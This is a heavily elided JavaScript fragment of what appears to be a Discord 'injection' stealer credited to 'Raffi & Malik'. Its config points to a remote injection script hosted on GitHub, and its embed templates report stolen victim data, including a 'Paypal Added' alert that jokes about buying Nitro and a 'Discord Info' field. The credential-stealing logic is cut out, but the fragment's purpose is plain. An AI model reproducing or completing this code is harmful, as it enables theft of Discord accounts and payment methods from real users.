...
const config = {
  ...
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/Raffi2020/blueeye/main/injection1.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By Raffi & Malik・ ',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Paypal Added**',
            value: `Time to buy some nitro baby 😩*:D*`,
            inline: false,
          },
          {
            name: '**Discord Info**',
